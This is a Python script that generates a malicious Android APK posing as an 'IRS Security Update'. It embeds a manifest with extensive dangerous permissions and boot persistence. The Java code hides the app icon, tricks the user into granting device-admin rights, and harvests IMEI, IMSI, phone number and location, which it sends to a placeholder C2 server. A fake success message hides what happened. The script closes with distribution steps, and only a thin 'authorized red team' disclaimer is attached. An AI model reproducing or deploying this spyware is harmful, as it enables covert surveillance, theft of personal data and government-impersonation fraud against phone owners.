#!/usr/bin/env python3
"""
Android APK Generator for Red Team Testing
Generates malicious APK with data collection capabilities
"""

import os
import zipfile
import xml.etree.ElementTree as ET
from datetime import datetime

def create_android_manifest():
    """Create AndroidManifest.xml with extensive permissions"""
    manifest = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.irs.securityupdate"
    android:versionCode="1"
    android:versionName="1.0">

    <!-- Dangerous permissions for maximum data collection -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
    
    <!-- Administrative permissions -->
    <uses-permission android:name="android.permission.DEVICE_ADMIN" />
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme">
        
        <activity
            android:name=".MainActivity"
            android:label="@string/app_name"
            android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Background service for data collection -->
        <service
            android:name=".DataCollectionService"
            android:enabled="true"
            android:exported="false" />

        <!-- Boot receiver to start service on boot -->
        <receiver android:name=".BootReceiver">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </receiver>

        <!-- Device admin receiver -->
        <receiver
            android:name=".DeviceAdminReceiver"
            android:label="@string/device_admin_label"
            android:description="@string/device_admin_description"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin_policies" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>"""
    return manifest

def create_main_activity():
    """Create MainActivity.java with data collection code"""
    activity_code = """package com.irs.securityupdate;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class MainActivity extends Activity {
    private static final String SERVER_URL = "https://your-c2-server.com/api/android-data";
    private static final int REQUEST_CODE_ENABLE_ADMIN = 1;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide app icon after launch
        hideAppIcon();
        
        // Request device admin privileges
        requestDeviceAdmin();
        
        // Collect and send device data
        collectAndSendData();
        
        // Start background service
        startService(new Intent(this, DataCollectionService.class));
        
        // Show fake success message
        Toast.makeText(this, "Security update installed successfully", Toast.LENGTH_LONG).show();
        
        // Finish activity (app appears to close)
        finish();
    }
    
    private void hideAppIcon() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
    
    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
        
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "Required for security update installation");
            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
        }
    }
    
    private void collectAndSendData() {
        try {
            JSONObject deviceData = new JSONObject();
            
            // Device identifiers
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                deviceData.put("imei", tm.getDeviceId());
                deviceData.put("imsi", tm.getSubscriberId());
                deviceData.put("phoneNumber", tm.getLine1Number());
                deviceData.put("networkOperator", tm.getNetworkOperatorName());
            }
            
            // Device info
            deviceData.put("androidId", Settings.Secure.getString(getContentResolver(), 
                    Settings.Secure.ANDROID_ID));
            deviceData.put("model", android.os.Build.MODEL);
            deviceData.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceData.put("androidVersion", android.os.Build.VERSION.RELEASE);
            deviceData.put("sdkVersion", android.os.Build.VERSION.SDK_INT);
            deviceData.put("bootloader", android.os.Build.BOOTLOADER);
            deviceData.put("hardware", android.os.Build.HARDWARE);
            
            // Location data
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location != null) {
                    deviceData.put("latitude", location.getLatitude());
                    deviceData.put("longitude", location.getLongitude());
                }
            }
            
            // System info
            deviceData.put("timezone", java.util.TimeZone.getDefault().getID());
            deviceData.put("locale", java.util.Locale.getDefault().toString());
            deviceData.put("timestamp", System.currentTimeMillis());
            
            // Send data to C2 server
            sendDataToServer(deviceData.toString());
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void sendDataToServer(String data) {
        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
        
        RequestBody body = RequestBody.create(data, MediaType.get("application/json; charset=utf-8"));
        Request request = new Request.Builder()
                .url(SERVER_URL)
                .post(body)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                // Silent failure
            }
            
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }
}"""
    return activity_code

def create_data_collection_service():
    """Create background service for continuous data collection"""
    service_code = """package com.irs.securityupdate;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import java.util.Timer;
import java.util.TimerTask;

public class DataCollectionService extends Service {
    private Timer timer;
    private Handler handler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startDataCollection();
        return START_STICKY; // Restart if killed
    }
    
    private void startDataCollection() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                handler.post(() -> {
                    // Collect SMS, contacts, call logs, etc.
                    collectSensitiveData();
                });
            }
        }, 0, 300000); // Every 5 minutes
    }
    
    private void collectSensitiveData() {
        // SMS collection
        collectSMS();
        
        // Contact collection
        collectContacts();
        
        // Call log collection
        collectCallLogs();
        
        // Location updates
        collectLocation();
    }
    
    // Implementation methods...
    private void collectSMS() { /* SMS extraction code */ }
    private void collectContacts() { /* Contacts extraction code */ }
    private void collectCallLogs() { /* Call logs extraction code */ }
    private void collectLocation() { /* Location tracking code */ }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}"""
    return service_code

def create_apk_structure():
    """Create basic APK file structure"""
    apk_name = "android-security-update.apk"
    
    # Create temporary directory structure
    os.makedirs("temp_apk/META-INF", exist_ok=True)
    os.makedirs("temp_apk/res/drawable", exist_ok=True)
    os.makedirs("temp_apk/res/values", exist_ok=True)
    os.makedirs("temp_apk/res/xml", exist_ok=True)
    
    # Write AndroidManifest.xml
    with open("temp_apk/AndroidManifest.xml", "w") as f:
        f.write(create_android_manifest())
    
    # Write classes.dex (simplified - normally would need dex compilation)
    # For testing, create a minimal dex file or use pre-compiled one
    
    # Write resources
    with open("temp_apk/res/values/strings.xml", "w") as f:
        f.write("""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">IRS Security Update</string>
    <string name="device_admin_label">Security Manager</string>
    <string name="device_admin_description">Required for security compliance</string>
</resources>""")
    
    # Create APK zip file
    with zipfile.ZipFile(apk_name, 'w', zipfile.ZIP_DEFLATED) as apk:
        for root, dirs, files in os.walk("temp_apk"):
            for file in files:
                file_path = os.path.join(root, file)
                archive_path = os.path.relpath(file_path, "temp_apk")
                apk.write(file_path, archive_path)
    
    # Cleanup
    import shutil
    shutil.rmtree("temp_apk")
    
    print(f"✅ APK created: {apk_name}")
    print(f"📁 Size: {os.path.getsize(apk_name)} bytes")
    return apk_name

if __name__ == "__main__":
    print("🔨 Generating Android APK for red team testing...")
    print("⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY")
    
    apk_file = create_apk_structure()
    
    print(f"""
📱 Android APK Generated: {apk_file}

🎯 Capabilities:
- Device admin privileges
- Comprehensive data collection
- Background service persistence
- Hidden app icon after install
- Location tracking
- SMS/contacts/call log access
- C2 communication

📋 Deployment:
1. Host APK on web server
2. Update C2 server URL in code
3. Sign APK for distribution
4. Test on authorized devices only

⚠️  Remember: This is for authorized red team testing only!
""")